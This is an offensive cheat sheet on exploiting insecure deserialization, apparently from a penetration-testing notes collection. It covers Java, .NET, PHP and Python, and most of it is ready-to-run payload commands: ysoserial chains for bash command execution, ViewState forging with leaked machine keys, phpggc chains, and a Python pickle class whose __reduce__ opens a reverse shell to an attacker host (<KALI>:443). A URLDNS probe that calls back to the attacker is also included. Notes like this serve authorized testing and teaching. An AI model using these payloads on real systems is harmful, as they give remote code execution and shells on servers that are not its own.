# Insecure deserialization

| Stack | Clue |
| --- | --- |
| Java | Base64 `rO0AB…` or bytes `ac ed 00 05` |
| .NET | `__VIEWSTATE`, BinaryFormatter, LosFormatter, Json.NET; signing + `machineKey` |
| PHP | `unserialize()` on your input + `__wakeup()` / `__destruct()` |
| Python | `pickle.loads()` on your input |

- ViewState: a leaked `web.config` machine key undermines protection.
- Compare baseline vs one harmless change; parser errors ≠ execution.

## Java
Find the parser sink (cookie, hidden field, `ViewState` in JSF, RMI/JMX port) and the libraries on the classpath.

```bash
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,<B64>}|{base64,-d}|{bash,-i}' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://<KALI>:8000/probe' | base64 -w0
```
- `URLDNS` needs no gadget library: a callback only proves the object is deserialized. Then try gadget chains until one matches the classpath.
- Java ≥ 16: ysoserial needs `--add-opens` flags (see its README); chain name list: `java -jar ysoserial.jar` with no arguments.
- The value may be URL- or base64-encoded; copy the encoding of the original.

## .NET
```text
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "<CMD>"
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<CMD>" --path="/<PAGE>.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<KEY>" --validationalg="SHA1" --validationkey="<KEY>"
```
- ViewState needs the `machineKey` (leaked `web.config` via [LFI](lfi.md)); without it, MAC is on and a forged value is rejected. Check exact flag names with `ysoserial.exe -h`.

## PHP
```bash
phpggc -l | grep -i <FRAMEWORK>
phpggc <CHAIN> system 'id' | base64 -w0
```
- Needs a known framework/library with a usable chain; `unserialize` on the app's own classes only with `__destruct` / `__wakeup` that reach a sink.

## Python pickle
```python
import pickle, base64, os

class R:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<KALI>/443 0>&1"',))

print(base64.b64encode(pickle.dumps(R())).decode())
```
- Send the output exactly where the app's pickle/base64 value sits. `YAML` (`!!python/object/apply:os.system`) behaves the same on unsafe `yaml.load`.
